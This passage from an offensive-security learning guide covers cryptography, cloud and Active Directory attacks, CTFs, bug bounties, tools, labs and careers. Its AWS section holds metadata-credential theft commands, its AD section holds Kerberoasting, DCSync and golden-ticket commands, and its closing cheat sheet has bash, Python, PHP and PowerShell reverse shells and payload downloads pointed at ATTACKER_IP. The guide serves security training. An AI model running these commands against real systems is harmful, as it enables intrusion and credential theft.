# Import binary → Auto-analysis → Function list → Decompiler view

# GDB debugging (Linux)
gdb ./binary
(gdb) info functions
(gdb) disas main
(gdb) break *main
(gdb) run
(gdb) x/20x $esp    # Examine stack
```

---

## 23. Cryptography for Hackers

### 23.1 Hashing
```
MD5    → 128-bit, BROKEN (collision attacks) — don't trust
SHA1   → 160-bit, WEAK — phased out
SHA256 → 256-bit, SECURE — current standard
SHA3   → Modern, secure
bcrypt → Password hashing, slow by design (good!)
Argon2 → Modern password hashing, best practice
```

### 23.2 Encryption
```
Symmetric (same key for encrypt/decrypt):
- AES-256 → Gold standard, secure
- DES/3DES → Old, avoid
- RC4 → Broken, used in WEP (crackable)

Asymmetric (public/private key pair):
- RSA → 2048-bit minimum, 4096 preferred
- ECDSA → More efficient than RSA
- Diffie-Hellman → Key exchange protocol

Common weaknesses:
- Weak key length (MD5, SHA1, DES)
- Hardcoded keys in source code
- ECB mode in AES (reveals patterns)
- Poor random number generation
- Improper certificate validation
```

### 23.3 SSL/TLS Attacks
```bash
# SSLScan
sslscan target.com:443

# Testssl.sh (comprehensive)
./testssl.sh target.com

# Common SSL issues:
- SSLv2/v3 still enabled
- TLS 1.0/1.1 enabled (deprecated)
- BEAST, POODLE, HEARTBLEED vulnerabilities
- Weak ciphers (RC4, DES, EXPORT)
- Invalid certificates
- HSTS not configured
```

---

## 24. Cloud Security Hacking

### 24.1 AWS Attacks
```bash
# Enumerate S3 buckets (misconfigured = publicly readable)
aws s3 ls s3://bucket-name --no-sign-request
aws s3 cp s3://bucket-name/secret.txt . --no-sign-request

# SSRF → IMDSv1 metadata (often gets AWS creds)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Enumerate with stolen credentials
aws configure  # Set up stolen access key
aws iam get-user
aws iam list-roles
aws s3 ls
aws ec2 describe-instances

# Pacu (AWS exploitation framework)
python3 pacu.py
```

### 24.2 Common Cloud Misconfigurations
- Public S3 buckets with sensitive data
- IMDSv1 enabled (allows SSRF → credential theft)
- Overpermissive IAM roles
- Security groups allowing 0.0.0.0/0 access
- Unencrypted storage/databases
- Default credentials on cloud services
- Publicly exposed RDS databases

---

## 25. Active Directory Attacks

AD is the heart of most enterprise environments. Compromising it = full network access.

### 25.1 AD Enumeration
```powershell
# BloodHound (visual AD attack paths)
# Collect data:
SharpHound.exe -c All
# Import to BloodHound → Find shortest path to Domain Admin

# PowerView
Import-Module PowerView.ps1
Get-Domain
Get-DomainUser
Get-DomainGroup -Name "Domain Admins"
Get-DomainComputer
Find-LocalAdminAccess   # Where is current user local admin?
```

### 25.2 Key AD Attacks
```bash
# Kerberoasting (crack service account passwords offline)
GetUserSPNs.py domain/user:password -dc-ip DC_IP -request
hashcat -m 13100 kerberoast_hashes.txt rockyou.txt

# AS-REP Roasting (accounts with pre-auth disabled)
GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC_IP
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# Pass-the-Ticket
# 1. Request TGT
getTGT.py domain/user:password
# 2. Use ticket
export KRB5CCNAME=user.ccache
klist

# DCSync (dump all AD hashes - requires DC sync rights)
secretsdump.py domain/user:password@DC_IP

# Golden Ticket (persistence after krbtgt hash)
mimikatz# kerberos::golden /user:admin /domain:corp.local /sid:DOMAIN_SID /krbtgt:HASH /ptt
```

### 25.3 AD Misconfigurations to Look For
- Kerberoastable service accounts with weak passwords
- AS-REP roastable users
- Unconstrained delegation
- ACL/ACE misconfigurations (WriteDACL, GenericAll, etc.)
- AdminSDHolder abuse
- Print Spooler enabled on DCs (PrintNightmare)

---

## 26. CTF (Capture The Flag) Guide

CTFs are the best way to practice legally and level up fast.

### 26.1 CTF Categories
| Category | Skills Needed |
|----------|--------------|
| **Web** | SQLi, XSS, LFI, SSRF, deserialization |
| **Pwn/Binary** | Buffer overflow, heap exploitation, ROP chains |
| **Reverse Engineering** | Assembly, debugging, decompilation |
| **Forensics** | File carving, steganography, network analysis |
| **Cryptography** | Cipher analysis, hash cracking, RSA attacks |
| **OSINT** | Information gathering, social media analysis |
| **Miscellaneous** | Scripting, lateral thinking |

### 26.2 CTF Mindset & Tips
1. **Read the challenge description carefully** — hints are often hidden in plain sight
2. **Check file metadata** — `file`, `exiftool`, `strings`, `binwalk`
3. **Try base64, ROT13, hex decoding** on suspicious strings
4. **Google the challenge title** — many hints in writeups for similar challenges
5. **Document everything** — save your work as you go
6. **Don't rage quit** — step away and come back with fresh eyes
7. **Read other writeups after solving** — learn different approaches

### 26.3 CTF Tools Cheat Sheet
```bash
# Forensics
binwalk -e file.png         # Extract hidden files
foremost -i disk.img        # File carving
volatility -f memory.raw imageinfo  # Memory forensics
steghide extract -sf image.jpg      # Steganography extract
exiftool file.jpg           # Metadata extraction

# Crypto
CyberChef (browser tool)    # Swiss Army knife for encoding/decoding
hashcat / john              # Hash cracking
rsatool / RsaCtfTool        # RSA attacks
factordb.com                # Factor large numbers

# Binary/Pwn
gdb + pwndbg / peda         # Debugger
pwntools (Python)           # Exploit framework
checksec binary             # Binary protections check
ROPgadget --binary ./bin    # Find ROP gadgets
```

---

## 27. Bug Bounty Hunting

Get paid legally to find vulnerabilities in real systems.

### 27.1 Top Bug Bounty Platforms
| Platform | Notable Programs |
|----------|-----------------|
| **HackerOne** | Twitter, GitHub, Uber, GitLab |
| **Bugcrowd** | Tesla, Mastercard, NETGEAR |
| **Intigriti** | EU-focused, big brands |
| **Synack** | Vetted, invitation only |
| **YesWeHack** | European platform |
| **Open Bug Bounty** | Responsible disclosure |

### 27.2 Bug Bounty Methodology
```
1. SCOPE REVIEW
   → Read rules carefully
   → Note in-scope domains/IPs
   → Note exclusions (support.target.com, blog.target.com)

2. RECONNAISSANCE
   → Subdomain enumeration (subfinder, amass, sublist3r)
   → Technology fingerprinting (Wappalyzer, whatweb)
   → JS file analysis (linkfinder, SecretFinder)
   → Parameter discovery (Arjun, paramspider)

3. TESTING
   → Focus on high-impact: IDOR, SQLi, Auth bypass, RCE
   → Don't just run scanners — manual testing wins
   → Business logic flaws → read the app's intended use

4. REPORTING
   → Clear title summarizing impact
   → Reproduction steps (numbered, precise)
   → Impact statement (what can an attacker do?)
   → Screenshot/PoC
   → Remediation suggestion
```

### 27.3 High-Value Bug Classes
- **RCE (Remote Code Execution)** → Usually Critical, $10K-$100K+
- **SQLi** → High to Critical
- **SSRF** → High (especially to cloud metadata)
- **IDOR with sensitive data** → High
- **Authentication bypass** → High to Critical
- **Stored XSS** → Medium to High
- **Open Redirect** → Low to Medium
- **Information disclosure** → Low to Medium

---

## 28. Tools Arsenal

### 28.1 Essential Tools by Category

**Reconnaissance**
| Tool | Use |
|------|-----|
| Maltego | OSINT link analysis |
| theHarvester | Email/subdomain gathering |
| Shodan | Internet device search |
| Amass | Subdomain enumeration |
| Subfinder | Fast subdomain discovery |
| Recon-ng | Web reconnaissance framework |

**Scanning & Enumeration**
| Tool | Use |
|------|-----|
| Nmap | Port scanner |
| Masscan | Ultra-fast port scanner |
| Gobuster | Directory/subdomain brute force |
| ffuf | Web fuzzer |
| Nikto | Web server scanner |
| enum4linux | SMB/Linux enumeration |

**Exploitation**
| Tool | Use |
|------|-----|
| Metasploit | Exploitation framework |
| SQLMap | SQL injection automation |
| Burp Suite | Web app proxy & testing |
| BeEF | Browser exploitation framework |
| Searchsploit | Local exploit-db search |

**Password Attacks**
| Tool | Use |
|------|-----|
| Hashcat | GPU-based hash cracking |
| John the Ripper | CPU hash cracking |
| Hydra | Online brute force |
| Medusa | Multi-protocol brute force |
| CrackMapExec | Windows/AD password attacks |

**Post-Exploitation**
| Tool | Use |
|------|-----|
| Mimikatz | Windows credential dumping |
| BloodHound | AD attack path visualization |
| PowerView | AD enumeration |
| LinPEAS/WinPEAS | Privilege escalation enumeration |
| Chisel | Network tunneling |
| Impacket | Python Windows protocol tools |

**Wireless**
| Tool | Use |
|------|-----|
| Aircrack-ng suite | WPA2 cracking |
| Reaver | WPS attacks |
| Bettercap | MITM framework |
| Kismet | Wireless discovery |

---

## 29. Labs & Practice Environments

Never practice on real systems without permission. Use these instead:

### 29.1 Online Platforms
| Platform | Level | Cost | Focus |
|----------|-------|------|-------|
| **TryHackMe** | Beginner → Intermediate | Free + Premium | Guided learning paths |
| **HackTheBox** | Intermediate → Advanced | Free + VIP | CTF-style machines |
| **PicoCTF** | Beginner | Free | CTF competitions |
| **PortSwigger Web Academy** | All levels | Free | Web app security |
| **VulnHub** | Beginner → Advanced | Free | Downloadable VMs |
| **OWASP WebGoat** | Beginner | Free | Intentionally vulnerable web app |
| **PentesterLab** | Beginner → Advanced | Free + Pro | Hands-on exercises |
| **CTFtime.org** | All levels | Free | CTF event calendar |

### 29.2 Local Lab Setup
```bash
# Install VirtualBox or VMware
# Download and run:
- Kali Linux (Attacker machine)
- Metasploitable2 (Vulnerable Linux target)
- DVWA - Damn Vulnerable Web App
- VulnHub machines (various)
- Windows Server eval (for AD labs)

# Network setup:
- Host-Only network: for isolated lab
- NAT: for internet access on Kali
- Internal network: for multi-machine pivoting
```

### 29.3 Recommended Learning Path
```
PHASE 1 - FOUNDATION (1-3 months)
├── TryHackMe: "Pre-Security" path
├── TryHackMe: "Jr Penetration Tester" path
└── PortSwigger Web Academy: All labs

PHASE 2 - PRACTICE (3-6 months)
├── HackTheBox: "Starting Point" machines
├── VulnHub: Beginner machines
└── PicoCTF competitions

PHASE 3 - INTERMEDIATE (6-12 months)
├── HackTheBox: Easy → Medium machines
├── Build and attack your own AD lab
└── Bug bounty: Start on HackerOne

PHASE 4 - ADVANCED (12+ months)
├── HackTheBox: Hard machines + Pro Labs
├── OSCP preparation (PWK course)
└── Specialized areas: mobile, IoT, cloud
```

---

## 30. Certifications Roadmap

### 30.1 Certification Path by Level

**Entry Level**
| Cert | Org | Focus |
|------|-----|-------|
| CompTIA Security+ | CompTIA | Security fundamentals |
| CompTIA Network+ | CompTIA | Networking |
| eJPT | eLearnSecurity | Junior penetration testing |
| CEH | EC-Council | Ethical hacking concepts |

**Intermediate**
| Cert | Org | Focus |
|------|-----|-------|
| **OSCP** | Offensive Security | Hands-on penetration testing |
| CompTIA PenTest+ | CompTIA | Pen testing methodology |
| PNPT | TCM Security | Practical network penetration testing |
| eCPPT | eLearnSecurity | Professional pen tester |

**Advanced**
| Cert | Org | Focus |
|------|-----|-------|
| OSEP | Offensive Security | Advanced evasion techniques |
| OSED | Offensive Security | Exploit development |
| OSWE | Offensive Security | Advanced web attacks |
| GXPN | GIAC | Advanced penetration testing |
| CRTE | Altered Security | Red team AD attacks |

### 30.2 The OSCP — Industry Standard
OSCP (Offensive Security Certified Professional) is the most respected hands-on certification:
- 24-hour practical exam — must compromise machines
- Requires report writing
- Pure hands-on, no multiple choice
- Gateway to most serious pen testing jobs

---

## 31. Career Paths

### 31.1 Jobs in Offensive Security
| Role | Avg Salary (US) | Description |
|------|----------------|-------------|
| Penetration Tester | $90K–$140K | Authorized system testing |
| Red Team Operator | $110K–$160K | Simulating advanced threats |
| Bug Bounty Hunter | Variable ($0–$500K+) | Independent vulnerability research |
| Security Researcher | $100K–$180K | Finding 0-days, CVEs |
| Malware Analyst | $85K–$130K | Reverse engineering malware |
| Exploit Developer | $130K–$200K+ | Writing novel exploits |

### 31.2 Jobs in Defensive Security
| Role | Description |
|------|-------------|
| SOC Analyst | Monitor and respond to alerts |
| Incident Responder | Handle security breaches |
| Threat Hunter | Proactively find threats |
| Blue Team Engineer | Build defensive capabilities |
| CISO | Executive security leadership |

### 31.3 Building Your Portfolio
- **GitHub** — Host your tools, scripts, and CTF writeups
- **Blog/Medium** — Document your learning journey
- **HackTheBox/TryHackMe profile** — Showcase your rank
- **CVEs** — Report real vulnerabilities responsibly
- **CTF wins** — Participate and document your solutions
- **LinkedIn** — Connect with the security community

---

## 32. Resources & Communities

### 32.1 Must-Read Books
| Book | Author | Focus |
|------|--------|-------|
| *Hacking: The Art of Exploitation* | Jon Erickson | Core hacking concepts + C |
| *The Web Application Hacker's Handbook* | Stuttard & Pinto | Web security bible |
| *Penetration Testing* | Georgia Weidman | Practical guide |
| *The Hacker Playbook 3* | Peter Kim | Red team tactics |
| *Red Team Development and Operations* | Joe Vest | Red teaming |
| *Silence on the Wire* | Michal Zalewski | Passive reconnaissance |
| *Social Engineering* | Christopher Hadnagy | Human manipulation |

### 32.2 Essential Websites
```
Learning:
- portswigger.net/web-security    Web security labs (FREE)
- tryhackme.com                   Guided hacking rooms
- hackthebox.eu                   CTF-style machines
- overthewire.org                 Wargames
- pwn.college                     Binary exploitation

References:
- owasp.org                       Web security reference
- exploit-db.com                  Exploit database
- nvd.nist.gov                    CVE database
- gtfobins.github.io              Linux priv esc with binaries
- lolbas-project.github.io        Windows living-off-the-land

News & Research:
- krebsonsecurity.com
- threatpost.com
- darknet.org.uk
- reddit.com/r/netsec
- reddit.com/r/hacking
```

### 32.3 YouTube Channels
| Channel | Focus |
|---------|-------|
| **IppSec** | HackTheBox walkthroughs (post-retirement) |
| **TCM Security** | Practical ethical hacking |
| **John Hammond** | CTF walkthroughs, malware analysis |
| **LiveOverflow** | Low-level hacking, CTFs |
| **NetworkChuck** | Networking + hacking basics |
| **David Bombal** | Networking + Python hacking |
| **The Cyber Mentor** | PNPT course, pentesting |

### 32.4 Communities
- **Discord**: TryHackMe, HackTheBox, TCM Security servers
- **Reddit**: r/netsec, r/hacking, r/AskNetsec, r/bugbounty
- **Twitter/X**: Follow security researchers (#infosec, #bugbounty)
- **DEF CON / Black Hat**: World's largest hacker conferences
- **BSides**: Local community security conferences
- **OWASP chapters**: Local meetups for web security

---

## Quick Reference: Hacker's Cheat Sheet

### Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# PHP
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'

# PowerShell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();...

# Netcat listener (on attacker)
nc -lvnp 4444

# Upgrade shell to TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
Ctrl+Z → stty raw -echo; fg → reset
```

### File Transfer
```bash
# Python HTTP server (on attacker)
python3 -m http.server 80

# Download on victim (Linux)
wget http://ATTACKER_IP/file
curl http://ATTACKER_IP/file -o file

# Download on victim (Windows)
certutil -urlcache -f http://ATTACKER_IP/file file
(New-Object Net.WebClient).DownloadFile('http://ATTACKER_IP/file','C:\file')
```

### Common Encodings
```
Base64:   echo "string" | base64    /    echo "c3RyaW5n" | base64 -d
URL:      %20 = space, %2F = /, %3C = <
HTML:     &lt; = <, &gt; = >, &amp; = &
Hex:      0x41 = A, 0x2F = /
Unicode:  \u003c = <, \u003e = >
```

---

> 🛡️ **Remember:** With great knowledge comes great responsibility. Use these skills to **protect**, **educate**, and **improve** security — never to harm.
>
> Every security professional was once a beginner. Keep learning. Keep hacking (ethically). 🔐

---

*Last Updated: 2026 | Part of the [Cybersecurity-Basics](https://github.com/yourusername/Cybersecurity-Basics) repository*